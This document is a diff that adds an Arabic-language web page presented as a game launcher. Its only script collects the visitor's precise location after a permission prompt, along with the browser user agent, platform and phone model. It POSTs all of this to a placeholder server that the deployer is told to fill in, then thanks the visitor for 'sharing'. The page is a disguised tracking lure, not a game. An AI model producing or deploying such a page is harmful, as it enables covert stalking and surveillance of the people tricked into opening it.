@@ -1,0 +1,75 @@
+<!doctype html>
+<html lang="ar">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title> بدا اللعبه</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; direction: rtl; }
+    button { padding: 10px 16px; font-size: 16px; cursor: pointer; }
+    #status { margin-top: 12px; color: #333; }
+  </style>
+</head>
+<body>
+  <h1>بدا اللعبة الان</h1>
+  <p>عند الضغط على الزر ستبدا اللعبه فورا.</p>
+  <button id="share">ابدا اللعبة الان </button>
+  <p id="status"></p>
+
+  <script>
+    // --- غيّر هذا إلى رابط الخادم العام (HTTPS) قبل النشر ---
+    const REPORT_URL = 'https://REPLACE-WITH-YOUR-SERVER/report';
+
+    document.getElementById('share').addEventListener('click', async () => {
+      const status = document.getElementById('status');
+      if (!('geolocation' in navigator)) {
+        status.textContent = 'المتصفح لا يدعم تحديد الموقع.';
+        return;
+      }
+      status.textContent = 'أطلب إذن تحديد الموقع...';
+
+      navigator.geolocation.getCurrentPosition(async (pos) => {
+        const data = {
+          timestamp: new Date().toISOString(),
+          coords: {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy
+          },
+          userAgent: navigator.userAgent || null,
+          platform: navigator.platform || null,
+          deviceHint: (() => {
+            const ua = navigator.userAgent || '';
+            if (/iPhone/i.test(ua)) return 'iPhone (موديل قد لا يظهر بدقة عبر المتصفح)';
+            if (/iPad/i.test(ua)) return 'iPad';
+            if (/Android/i.test(ua)) {
+              const m = ua.match(/Android.*;\s*([^)]+)/);
+              return m ? m[1].trim() : 'Android (طراز غير معروف)';
+            }
+            return 'Unknown';
+          })()
+        };
+
+        try {
+          const resp = await fetch(REPORT_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data),
+            mode: 'cors'
+          });
+          if (resp.ok) {
+            status.textContent = 'تم الإرسال بنجاح. شكراً لمشاركتك.';
+          } else {
+            status.textContent = 'فشل الإرسال. رمز: ' + resp.status;
+          }
+        } catch (e) {
+          status.textContent = 'خطأ في الاتصال بالخادم.';
+          console.error(e);
+        }
+      }, (err) => {
+        status.textContent = 'لم تُمنح إذن الموقع أو حدث خطأ: ' + err.message;
+      }, { enableHighAccuracy: false, timeout: 15000 });
+    });
+  </script>
+</body>
+</html>
